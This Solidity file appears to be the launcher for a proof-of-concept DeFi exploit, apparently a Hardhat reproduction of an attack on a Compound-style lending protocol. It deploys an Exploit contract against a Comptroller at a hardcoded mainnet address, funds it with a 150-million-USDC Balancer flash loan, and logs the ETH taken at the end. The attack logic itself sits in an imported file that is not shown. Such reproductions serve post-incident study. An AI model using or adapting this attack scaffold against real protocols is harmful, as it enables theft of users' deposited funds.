pragma solidity ^0.5.16;

import "./interfaces/IERC20.sol";
import "./Vault.sol";
import "./interfaces/IFlashLoanRecipient.sol";
import "./Exploit.sol";

import "hardhat/console.sol";

contract Launcher {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    Vault balancerVault = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); 
    Exploit public exploit;
    Comptroller public troll = Comptroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    constructor () public {
        console.log("[Launcher] (0) Deploy launcher contract");
        exploit = new Exploit(address(this), troll, balancerVault);
    }

    function main() public {
        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amounts = new uint[](1);
        tokens[0] = USDC;
        amounts[0] = 150000000000000;
        console.log("[Launcher] (2) Flash loan USDC and WETH from Balancer");
        balancerVault.flashLoan(exploit, tokens, amounts, "0x");
        console.log("[Launcher] (10) End");
        console.log("[Launcher]      ETH: %s", address(this).balance);
    }

    function() external payable {}
}